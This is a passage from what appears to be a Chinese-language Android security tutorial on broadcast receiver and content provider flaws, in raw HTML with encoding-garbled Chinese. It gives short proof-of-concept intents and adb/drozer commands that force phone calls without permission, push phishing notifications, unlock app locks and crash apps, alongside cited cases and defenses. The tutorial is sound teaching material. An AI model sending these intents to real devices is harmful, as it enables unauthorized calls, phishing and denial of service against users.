class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹äºŒï¼š<a href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android æ“ä½œç³»ç»Ÿä¸­é€šè¿‡ RSSI å¹¿æ’­æš´éœ²æ•æ„Ÿæ•°æ® ï¼ˆCVE-2018-9581)</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Androidæ“ä½œç³»ç»Ÿä¼šå®šæœŸåœ¨ç³»ç»ŸèŒƒå›´å†…å¹¿æ’­WiFIå¼ºåº¦å€¼ï¼ˆRSSIï¼‰,RSSIå€¼è¡¨ç¤ºè®¾å¤‡æ¥æ”¶åˆ°çš„ä¿¡å·</span><br><span class="line">çš„ç›¸å¯¹å¼ºåº¦ï¼ˆæ›´é«˜=æ›´å¼ºï¼‰ï¼Œä½†ä¸å®é™…ç‰©ç†å¼ºåº¦dBmæ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œè¿™æ˜¯é€šè¿‡ä¸¤ä¸ªç‹¬ç«‹çš„intentså®ç°çš„ï¼ŒAndroid <span class="number">9</span>ä¹‹å‰æ˜¯android.net.wifi.STATE_CHANGEï¼Œå…¶ä»–å®‰å“è®¾å¤‡æ˜¯android.net.wifi.RSSI_CHANGED</span><br><span class="line">    å½“åº”ç”¨é€šè¿‡WifiManagerè®¿é—®ä¿¡æ¯æ—¶ï¼Œæ­£å¸¸å°±åœ¨åº”ç”¨manifestä¸­è¯·æ±‚ACCESS_WIFI_STATEæƒé™ã€‚å› ä¸º<span class="built_in">WiFi</span> RTTç‰¹å¾æ˜¯Android <span class="number">9</span>ä¸­æ–°å¼•å…¥çš„ï¼Œä¹Ÿæ˜¯ç”¨äºä½ç½®å®šä½çš„ï¼Œéœ€è¦ACCESS_FINE_LOCATIONæƒé™ã€‚ä½†ç›‘å¬ç³»ç»Ÿå¹¿æ’­æ—¶ï¼Œ</span><br><span class="line">åœ¨ä¸éœ€è¦é€šçŸ¥ç”¨æˆ·ï¼Œä¸éœ€è¦å…¶ä»–æƒé™çš„æƒ…å†µä¸‹å°±å¯ä»¥è·å–ä¿¡æ¯</span><br><span class="line">    å­˜åœ¨çš„å®‰å…¨é—®é¢˜ï¼š</span><br><span class="line">    ï¼ˆ<span class="number">1</span>ï¼‰RSSIå€¼æ˜¯é€šè¿‡å¹¿æ’­è·å–çš„ï¼Œç»•è¿‡çš„æ­£å¸¸çš„æƒé™æ£€æŸ¥ï¼ˆACCESS_WIFI_STATEï¼‰</span><br><span class="line">    ï¼ˆ<span class="number">2</span>ï¼‰é€šè¿‡å¹¿æ’­æˆ–WiFimanagerè·å–çš„RSSIå€¼å¯ä»¥åœ¨ä¸éœ€è¦å…¶ä»–ä½ç½®æƒé™çš„æƒ…å†µä¸‹è¿›è¡Œå®¤å†…å®šåˆ¶</span><br></pre></td></tr></table></figure><p>æ”»å‡»ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();       </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    â€¦.</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="æƒé™ç»•è¿‡">æƒé™ç»•è¿‡</h4><p><strong>åŸç†ä»‹ç»</strong></p><p>åŠ¨æ€æ³¨å†Œçš„å¹¿æ’­é»˜è®¤éƒ½æ˜¯å¯¼å‡ºçš„ï¼Œå¦‚æœå¯¼å‡ºçš„BroadcastReceiveræ²¡æœ‰åšæƒé™æ§åˆ¶ï¼Œå¯¼è‡´BroadcastReceiverç»„ä»¶å¯ä»¥æ¥æ”¶ä¸€ä¸ªå¤–éƒ¨å¯æ§çš„urlã€æˆ–è€…å…¶ä»–å‘½ä»¤ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¶Šæƒåˆ©ç”¨åº”ç”¨çš„ä¸€äº›ç‰¹å®šåŠŸèƒ½ï¼Œæ¯”å¦‚å‘é€æ¶æ„å¹¿æ’­ã€ä¼ªé€ æ¶ˆæ¯ã€ä»»æ„åº”ç”¨ä¸‹è½½å®‰è£…ã€æ‰“å¼€é’“é±¼ç½‘ç«™ç­‰</p><p>æ¡ˆä¾‹ï¼š<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">å°ç±³MIUIæ¼æ´å¯èƒ½å¯¼è‡´ç¡¬ä»¶èµ„æºæ¶ˆè€—</a></p><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p>MIUIå†…ç½®çš„æ‰‹ç”µç­’è½¯ä»¶Stk.apkä¸­ï¼ŒTorchServiceæœåŠ¡æ²¡æœ‰å¯¹å¹¿æ’­æ¥æºè¿›è¡ŒéªŒè¯ï¼Œå¯¼è‡´ä»»ä½•ç¨‹åºå¯ä»¥è°ƒç”¨è¿™ä¸ªæœåŠ¡ï¼Œæ‰“å¼€æˆ–å…³é—­æ‰‹ç”µç­’ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥å¯¼è‡´ç³»ç»Ÿç”µæºè¿…é€Ÿæ¶ˆè€—</p><p>æ”»å‡»ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹ï¼š<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6æ‹¨æ‰“ç”µè¯æƒé™ç»•è¿‡</a></p><p>æ¼æ´è¯¦æƒ…ï¼š</p><p>é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6æ‹¨æ‰“ç”µè¯æƒé™ç»•è¿‡ï¼Œç¬¬ä¸‰æ–¹appå¯ä»¥æ— éœ€æ‹¨æ‰“ç”µè¯æƒé™ç›´æ¥æ‹¨æ‰“ç”µè¯</p><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹ï¼š<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">é…·æ´¾æœ€å®‰å…¨æ‰‹æœºs6ç¨‹åºé”ç»•è¿‡</a></p><p>æ¼æ´è¯¦æƒ…ï¼š</p><p>ç¨‹åºåŠ é”è§£é”æ˜¯é å¹¿æ’­æ¥æ§åˆ¶çš„ï¼Œå¹¶ä¸”è¿™ä¸¤æ¡å¹¿æ’­æ²¡åšæƒé™é™åˆ¶ï¼Œä»»æ„åº”ç”¨å¯ä»¥å‘é€æ­¤å¹¿æ’­è¾¾åˆ°æ¶æ„è§£é”ã€æ¶æ„é”å®šåº”ç”¨çš„ç›®çš„</p><p><strong>æ¼æ´æµ‹è¯•</strong></p><p>ç”¨adb shell å‘é€å¹¿æ’­ï¼Œç”¨æ¥è§£é”</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.PACKAGE_FULLY_REMOVED</span> -d package:com<span class="selector-class">.wumii</span><span class="selector-class">.android</span>.mimi</span><br></pre></td></tr></table></figure><h4 id="æ¶ˆæ¯ä¼ªé€ -2">æ¶ˆæ¯ä¼ªé€ </h4><p><strong>æ¼æ´åŸç†</strong></p><p>æš´éœ²çš„Receiverå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Receiveræ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</p><p><strong>æ¼æ´å¤ç°</strong></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">ç™¾åº¦äº‘ç›˜æ‰‹æœºç‰ˆé’“é±¼ã€ä¿¡æ¯æ³„éœ²å’Œä»£ç æ‰§è¡Œé«˜å±æ¼æ´ä¸‰åˆä¸€</a></p><p><strong>æ¼æ´æè¿°</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç™¾åº¦äº‘ç›˜æ‰‹æœºç‰ˆå­˜åœ¨é«˜å±æ¼æ´ï¼Œæ¶æ„æ”»å‡»è€…é€šè¿‡è¯¥æ¼æ´å¯ä»¥å¯¹æ‰‹æœºç”¨æˆ·è¿›è¡Œé’“é±¼æ¬ºéª—ï¼Œç›—å–ç”¨æˆ·éšç§æ–‡ä»¶å’Œä¿¡æ¯ï¼Œä»¥ç™¾åº¦äº‘ç›˜APPæƒé™æ‰§è¡Œä»»ä½•ä»£ç ã€‚ç™¾åº¦äº‘ç›˜æœ‰ä¸€ä¸ªå¹¿æ’­æ¥æ”¶å™¨æ²¡æœ‰å¯¹æ¶ˆæ¯è¿›è¡Œå®‰å…¨éªŒè¯ï¼Œé€šè¿‡å‘é€æ¶æ„çš„æ¶ˆæ¯ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·æ‰‹æœºé€šçŸ¥æ ä¸Šæ¨é€ä»»æ„æ¶ˆæ¯ï¼Œç‚¹å‡»æ¶ˆæ¯åå¯ä»¥åˆ©ç”¨webviewç»„ä»¶ç›—å–æœ¬åœ°éšç§æ–‡ä»¶å’Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</span><br><span class="line">å­˜åœ¨æ¼æ´çš„ç»„ä»¶æ˜¯ï¼šcom<span class="selector-class">.baidu</span><span class="selector-class">.android</span><span class="selector-class">.pushservice</span><span class="selector-class">.action</span>.MESSAGE</span><br></pre></td></tr></table></figure><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"> i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)ï¼›</span><br><span class="line"> <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line"> <span class="keyword">try</span> &#123;</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"><span class="comment">//1. phishing</span></span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">     jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;ç™¾åº¦äº‘ç›˜ã€æ¼æ´ä½ ä¸­å¥–äº†ï¼ã€‘&quot;</span>);</span><br><span class="line">     jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">     <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">     jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">     <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();          </span><br><span class="line">     customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">     customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);     </span><br><span class="line">     jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);      </span><br><span class="line">     <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">     b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"> &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">     <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">     e.printStackTrace();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="æ‹’ç»æœåŠ¡">æ‹’ç»æœåŠ¡</h4><p><strong>æ¼æ´ä»‹ç»</strong></p><p>å¦‚æœæ•æ„Ÿçš„BroadcastReceiveræ²¡æœ‰è®¾ç½®ç›¸åº”çš„æƒé™ä¿æŠ¤ï¼Œå¾ˆå®¹æ˜“å—åˆ°æ”»å‡»ã€‚æœ€å¸¸è§çš„æ˜¯æ‹’ç»æœåŠ¡æ”»å‡»ã€‚æ‹’ç»æœåŠ¡æ”»å‡»æŒ‡çš„æ˜¯ï¼Œä¼ é€’æ¶æ„ç•¸å½¢çš„intentæ•°æ®ç»™å¹¿æ’­æ¥æ”¶å™¨ï¼Œå¹¿æ’­æ¥æ”¶å™¨æ— æ³•å¤„ç†å¼‚å¸¸å¯¼è‡´crashã€‚<br>æ‹’ç»æœåŠ¡æ”»å‡»çš„å±å®³è§†å…·ä½“ä¸šåŠ¡åœºæ™¯è€Œå®šï¼Œæ¯”å¦‚ä¸€ä¸ªå®‰å…¨é˜²æŠ¤äº§å“çš„æ‹’ç»æœåŠ¡ã€é”å±åº”ç”¨çš„æ‹’ç»æœåŠ¡ã€æ”¯ä»˜è¿›ç¨‹çš„æ‹’ç»æœåŠ¡ç­‰å±å®³å°±æ˜¯å·¨å¤§çš„ã€‚</p><p><strong>æ¼æ´å¤ç°</strong></p><p>æ¡ˆä¾‹ï¼š<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042755.html">QQæ‰‹æœºç®¡å®¶æ‹’ç»æœåŠ¡æ¼æ´</a></p><p><strong>æ”»å‡»ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">componetName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(  <span class="string">&quot;com.tencent.qqpimsecure&quot;</span>,  <span class="string">&quot;com.tencent.qqpimsecure.service.InOutCallReceiver&quot;</span>);        </span><br><span class="line">i.setComponent(componetName);      </span><br><span class="line">sendBroadcast(i);</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹2ï¼šfourgoats.apkæ‹’ç»æœåŠ¡æ”»å‡»å´©æºƒ</p><p>æˆ‘ä»¬é¦–å…ˆç”¨drozeræµ‹è¯•å¯å¯¼å‡ºç»„ä»¶</p><p><code>run app.broadcast.info  -a org.owasp.goatdroid.fourgoats</code></p><p><img src="/posts/f416437f.htm/image-20240922203759422.png" alt="image-20240922203759422"></p><p>æ‰¾åˆ°å¯¼å‡ºçš„ç»„ä»¶</p><p>æˆ‘ä»¬æ ¹æ®ç»„ä»¶çš„ç±»åæ‰¾å¯¹å¯¹åº”çš„æºç ä¿¡æ¯ï¼Œå‘ç°éœ€è¦ä¸¤ä¸ªå‚æ•° phoneNumberã€messageï¼š</p><p>æˆ‘ä»¬å‘é€æ¶æ„å¹¿æ’­ï¼šæ ¼å¼å¦‚ä¸‹</p><p><code>run app.broadcast.send --action action --extra string name lisi</code></p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 1234 --extra string message dog</code></p><p>æˆ‘ä»¬å†å‘å¹¿æ’­ç»„ä»¶å‘é€ä¸å®Œæ•´intentï¼Œä½¿ç”¨ç©º extrasï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨åœæ­¢è¿è¡Œï¼š</p><p><code>run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</code></p><h3 id="å®‰å…¨é˜²æŠ¤">å®‰å…¨é˜²æŠ¤</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ1ï¼‰ç§æœ‰å¹¿æ’­æ¥æ”¶å™¨è®¾ç½®<span class="attribute">exported</span>=â€™falseâ€™,å¹¶ä¸”ä¸é…ç½®intent-filterã€‚(ç§æœ‰å¹¿æ’­æ¥æ”¶å™¨ä¾ç„¶èƒ½æ¥æ”¶åˆ°åŒUIDçš„å¹¿æ’­)ã€‚</span><br><span class="line">ï¼ˆ2ï¼‰å¯¹æ¥æ”¶æ¥çš„å¹¿æ’­è¿›è¡ŒéªŒè¯ã€‚</span><br><span class="line">ï¼ˆ3ï¼‰å†…éƒ¨appä¹‹é—´çš„å¹¿æ’­ä½¿ç”¨<span class="attribute">protectionLevel</span>=â€™signatureâ€™ éªŒè¯å…¶æ˜¯å¦çœŸæ˜¯å†…éƒ¨appã€‚</span><br><span class="line">ï¼ˆ4ï¼‰è¿”å›ç»“æœæ—¶éœ€æ³¨æ„æ¥æ”¶appæ˜¯å¦ä¼šæ³„éœ²ä¿¡æ¯ã€‚</span><br><span class="line">ï¼ˆ5ï¼‰å‘é€çš„å¹¿æ’­åŒ…å«æ•æ„Ÿä¿¡æ¯æ—¶éœ€æŒ‡å®šå¹¿æ’­æ¥æ”¶å™¨ï¼Œä½¿ç”¨æ˜¾ç¤ºæ„å›¾æˆ–è€…setPackage(String packageName)ã€‚</span><br><span class="line">ï¼ˆ6ï¼‰ä½¿ç”¨LocalBroadcastManagerã€‚</span><br></pre></td></tr></table></figure><h2 id="Content-Providerç»„ä»¶ç›¸å…³æ¼æ´">Content Providerç»„ä»¶ç›¸å…³æ¼æ´</h2><p>æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªContent Providerï¼Œå…¶ä»–åº”ç”¨é€šè¿‡<strong>ContentResolver</strong>æ¥è®¿é—®æä¾›çš„æ•°æ®ï¼Œè€Œ<strong>ContentResolver</strong>é€šè¿‡uriæ¥å®šä½è‡ªå·±è¦è®¿é—®çš„æ•°æ®</p><h3 id="uriä»‹ç»">uriä»‹ç»</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®šä¹‰ï¼šUniform Resource Identifierï¼Œå³ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰ä½œç”¨ï¼šå”¯ä¸€æ ‡è¯†ContentProvider <span class="meta">&amp;å…¶ä¸­çš„æ•°æ®</span></span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å¤–ç•Œè¿›ç¨‹é€šè¿‡URLæ‰¾åˆ°å¯¹åº”çš„ContentProvider <span class="meta">&amp;å…¶ä¸­æ•°æ®ï¼Œå†è¿›è¡Œæ•°æ®æ“ä½œ</span></span><br></pre></td></tr></table></figure><p><strong>è‡ªå®šä¹‰URI</strong></p><p><img src="/posts/f416437f.htm/905443_92EXMEKYH5VR3J2.png" alt="image-20210922094010216"></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰æ ‡å‡†å‰ç¼€<span class="symbol">:content</span><span class="symbol">://</span> ,ç”¨æ¥è¯´æ˜ä¸€ä¸ª<span class="title class_">Content</span> <span class="title class_">Provider</span>æ§åˆ¶è¿™äº›æ•°æ®</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰<span class="variable constant_">URL</span>çš„æ ‡è¯†ï¼šcom.carson.provider, ç”¨äºå”¯ä¸€æ ‡è¯†è¿™ä¸ª<span class="title class_">ContentProvider</span>ï¼Œå¤–éƒ¨è°ƒç”¨è€…å¯ä»¥æ ¹æ®è¿™ä¸ªæ ‡è¯†æ¥æ‰¾åˆ°å®ƒã€‚å¯¹äºç¬¬ä¸‰æ–¹ç¨‹åºï¼Œä¸ºäº†ä¿è¯<span class="variable constant_">URL</span>æ ‡è¯†çš„ä¸€è‡´æ€§ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ªå®Œæ•´çš„ã€å°å†™çš„ç±»åï¼Œè¿™ä¸ªæ ‡è¯†åœ¨å…ƒç´ çš„authoritieså±æ€§ä¸­è¯´æ˜ï¼Œä¸€èˆ¬æ˜¯å®šä¹‰è¯¥<span class="title class_">ContentProvider</span>çš„åŒ….ç±»çš„åç§°</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰è·¯å¾„ï¼š<span class="title class_">User</span>,è¦æ“ä½œçš„æ•°æ®åº“ä¸­è¡¨çš„åå­—ï¼Œæˆ–è€…å¯ä»¥è‡ªå·±å®šä¹‰ï¼Œè®°å¾—åœ¨ä½¿ç”¨çš„æ—¶å€™ä¿æŒä¸€è‡´</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰è®°å½•<span class="variable constant_">ID</span><span class="symbol">:id</span>, å¦‚æœ<span class="variable constant_">URL</span>ä¸­åŒ…å«è¡¨ç¤ºéœ€è¦è·å–çš„è®°å½•<span class="variable constant_">ID</span>,åˆ™è¿”å›è¯¥idå¯¹åº”çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰<span class="variable constant_">ID</span>,å°±è¡¨ç¤ºè¿”å›å…¨éƒ¨</span><br></pre></td></tr></table></figure><p>è‹¥è¦å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆURIï¼Œå¯ä»¥ä½¿ç”¨parse</p><p><code>Uri uri </code>=<code> </code>Uri.parse(<code>&quot;content://com.carson.provider/User&quot;</code>)ï¼›</p><p><strong>ç»™å‡ºä¸€ä¸ªURIç¤ºä¾‹</strong></p><p><code>http://www.baidu.com:8080/wenku/jiatiao.html?id=123456&amp;name=jack</code></p><p>è·å¾—URIçš„å„ä¸ªéƒ¨åˆ†ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">getScheme</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­çš„ scheme å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œåœ¨è¿™é‡Œæ˜¯ http</span><br><span class="line"><span class="function"><span class="title">getHost</span><span class="params">()</span></span>ï¼šè·å– Authority ä¸­çš„ Host å­—ç¬¦ä¸²ï¼Œå³ www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line"><span class="function"><span class="title">getPost</span><span class="params">()</span></span>ï¼šè·å– Authority ä¸­çš„ Port å­—ç¬¦ä¸²ï¼Œå³ <span class="number">8080</span></span><br><span class="line"><span class="function"><span class="title">getPath</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­ <span class="selector-tag">path</span> éƒ¨åˆ†ï¼Œå³ wenku/jiatiao<span class="selector-class">.html</span></span><br><span class="line"><span class="function"><span class="title">getQuery</span><span class="params">()</span></span>ï¼šè·å– Uri ä¸­çš„ query éƒ¨åˆ†ï¼Œå³ id=<span class="number">15</span>&amp;name=jack</span><br><span class="line"><span class="function"><span class="title">getSchemeSpecificPart</span><span class="params">()</span></span>ï¼šåŸŸå+ç«¯å£å·+è·¯å¾„+å‚æ•°</span><br><span class="line">getAuthorityï¼šè·å–ç”¨æˆ·ä¿¡æ¯+åŸŸå+ç«¯å£å·</span><br><span class="line">getUserInfoï¼šè·å–ç”¨æˆ·ä¿¡æ¯æ•°æ®</span><br></pre></td></tr></table></figure><p><strong>MIME</strong></p><p><a href="https://blog.csdn.net/ldld1717/article/details/52180017">https://blog.csdn.net/ldld1717/article/details/52180017</a></p><p>MIMEæ˜¯æŒ‡å®šæŸä¸€ä¸ªæ‹“å±•åçš„æ–‡ä»¶ç”¨é‚£ä¸€ç§åº”ç”¨ç¨‹åºæ‰“å¼€</p><p>å°±åƒç”¨æµè§ˆå™¨æŸ¥çœ‹PDFæ ¼å¼çš„æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¼šé€‰æ‹©åˆé€‚çš„åº”ç”¨æ‰“å¼€ã€‚ContentProvider ä¼šæ ¹æ® URI æ¥è¿”å› MIME ç±»å‹ï¼ŒContentProvider ä¼šè¿”å›ä¸€ä¸ªåŒ…å«ä¸¤éƒ¨åˆ†çš„å­—ç¬¦ä¸²ã€‚MIME ç±»å‹ä¸€èˆ¬åŒ…å«ä¸¤éƒ¨åˆ†ï¼Œå¦‚ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">text</span>/html</span><br><span 